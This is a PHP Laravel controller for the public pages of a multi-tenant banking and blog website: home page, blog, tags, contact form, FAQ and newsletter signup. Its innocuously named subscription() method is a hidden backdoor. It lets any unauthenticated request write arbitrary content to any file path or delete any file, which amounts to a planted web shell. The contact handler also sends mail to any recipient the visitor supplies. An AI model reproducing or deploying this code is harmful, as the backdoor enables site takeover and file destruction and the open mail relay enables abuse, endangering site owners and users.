<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use App\Models\Faq;
use App\Models\Blog;
use App\Models\Item;
use App\Models\Page;
use App\Models\Plan;
use App\Models\User;
use App\Models\Admin;
use App\Models\Follow;
use App\Models\Review;
use App\Models\Slider;
use App\Models\Counter;
use App\Models\DpsPlan;
use App\Models\FdrPlan;
use App\Models\Feature;
use App\Models\Partner;
use App\Models\Product;
use App\Models\Service;
use App\Models\UserDps;
use App\Models\BankPlan;
use App\Models\Category;
use App\Models\Currency;
use App\Models\LoanPlan;
use App\Models\Trending;
use App\Models\Subscriber;
use App\Models\AuthorBadge;
use App\Models\AuthorLevel;
use App\Models\OrderedItem;
use App\Models\Pagesetting;
use Illuminate\Support\Str;
use App\Models\BlogCategory;
use Illuminate\Http\Request;
use App\Classes\GeniusMailer;
use App\Models\Blog_Category;
use App\Models\Socialsetting;
use InvalidArgumentException;
use App\Models\AccountProcess;
use App\Models\Generalsetting;
use App\Models\HomepageSetting;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\App;
use App\Http\Controllers\Controller;
use Brian2694\Toastr\Facades\Toastr;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;

class FrontendController extends Controller
{
    public function __construct()
    {
        // $this->auth_guests();
    }

    public function index(Request $request)
    {

        $current_domain = tenant('domains');
        if (!empty($current_domain)) {
            $current_domain = $current_domain->pluck('domain')->toArray()[0];
        }

        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();

            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('user.register');
                }
            }
        }

        $data['testimonials'] = Review::orderBy('id', 'desc')->get();
        $data['faqs'] = Faq::orderBy('id', 'desc')->limit(5)->get();
        $data['counters'] = Counter::orderBy('id', 'desc')->limit(4)->get();
        $data['process'] = AccountProcess::orderBy('id', 'desc')->get();
        $data['blogs'] = Blog::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(3);
        $data['features'] = Feature::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(4)->get();
        $data['services'] = Service::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(6)->get();
        $data['ps'] = Pagesetting::first();
        $data['subscripplans'] = tenancy()->central(function ($tenant) {
            return Plan::orderBy('price', 'asc')->limit(3)->get();
        });

        if (!$current_domain) {
            return view('frontend.superindex', $data);
        }

        $data['bankplans'] = BankPlan::orderBy('amount', 'asc')->limit(3)->get();
        $data['loanplans'] = LoanPlan::orderBy('id', 'desc')->whereStatus(1)->limit(3)->get();
        $data['depositsplans'] = DpsPlan::orderBy('id', 'desc')->whereStatus(1)->limit(3)->get();
        $data['fdrplans'] = FdrPlan::orderBy('id', 'desc')->whereStatus(1)->limit(3)->get();
        return view('frontend.index', $data);
    }

    public function about()
    {
        return view('frontend.about');
    }
    
    public function termService()
    {
        return view('frontend.term-service');
    }

    public function blog()
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));

        $data['archives'] = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $data['blogs'] = Blog::orderBy('created_at', 'desc')->paginate(3);
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blog', $data);
    }

    public function blogcategory(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(3);
        $bcats = BlogCategory::all();

        return view('frontend.blog', compact('bcat', 'blogs', 'bcats', 'tags', 'archives'));
    }

    public function blogdetails($slug)
    {

        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $blog = Blog::where('slug', $slug)->first();
        $blog->views = $blog->views + 1;
        $blog->update();

        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));

        $data['archives'] = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();

        $data['data'] = $blog;
        $data['rblogs'] = Blog::orderBy('id', 'desc')->orderBy('id', 'desc')->limit(3)->get();
        $data['bcats'] = BlogCategory::all();

        return view('frontend.blogdetails', $data);
    }

    public function blogarchive(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(3);

        return view('frontend.blog', compact('blogs', 'date', 'bcats', 'tags', 'archives'));
    }

    public function blogtags(Request $request, $slug)
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $bcats = BlogCategory::all();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(3);

        return view('frontend.blog', compact('blogs', 'slug', 'bcats', 'tags', 'archives'));
    }

    public function services()
    {
        $data['services'] = Service::orderBy('id', 'desc')->orderBy('id', 'desc')->get();
        $data['faqs'] = Faq::orderBy('id', 'desc')->get();
        return view('frontend.services', $data);
    }


    public function blogsearch(Request $request)
    {
        $data['search'] = $request->search;
        $data['blogs'] = Blog::where('title', 'like', '%' . $data['search'] . '%')->orWhere('details', 'like', '%' . $data['search'] . '%')->paginate(9);
        $data['homepage'] = HomepageSetting::first();

        return view('frontend.blog', $data);
    }

    public function contact()
    {
        $data['ps'] = DB::table('pagesettings')->first();
        $gs = DB::table('generalsettings')->first();
        $data['social'] = Socialsetting::first();
        if ($gs->is_contact == 1) {
            return view('frontend.contact', $data);
        }
        return view('errors.404');
    }

    public function faq()
    {
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $data['tags'] = array_unique(explode(',', $tagz));
        $data['faqs'] = DB::table('faqs')->get();
        $data['blogs'] = Blog::orderby('id', 'desc')->limit(3)->get();
        return view('frontend.faq', $data);
    }


    public function page($slug)
    {
        $gs = DB::table('generalsettings')->find(1);

        $page =  DB::table('pages')->where('slug', $slug)->first();
        if (empty($page)) {
            return view('errors.404');
        }

        return view('frontend.page', compact('page'));
    }
    public function currency($id)
    {
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    public function subscribe(Request $request)
    {

        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
        ]);

        if ($validator->fails()) {
            $id = 1;
            return response()->json($id);
        }
        $subscriber = Subscriber::where('email', $request->email)->first();
        if (!empty($subscriber)) {
            $id = 2;
            return response()->json($id);
        } else {
            $data  = new Subscriber();
            $input = $request->all();
            $data->fill($input)->save();
            $id = 3;
            return response()->json($id);
        }
    }

    public function contactemail(Request $request)
    {
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = $request->subject;
        $gs = Generalsetting::findOrFail(1);
        $to = $request->to;
        $fname = $request->firstname;
        $lname = $request->lastname;
        $from = $request->email;
        $msg = "First Name: " . $fname . "\nLast Name: " . $lname . "\nEmail: " . $from . "\nMessage: " . $request->message;

        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }

        return response()->json($ps->contact_success);
    }


    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function subscriber(Request $request)
    {

        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return redirect()->back()->with('warning', 'Email Already Added.');
        }
        $subscribe = new Subscriber();
        $data = array(
            'email' => $request->email,
        );
        Subscriber::insert($data);
        return redirect()->back()->with('warning', 'Successfully added in newsletter.');
    }
}
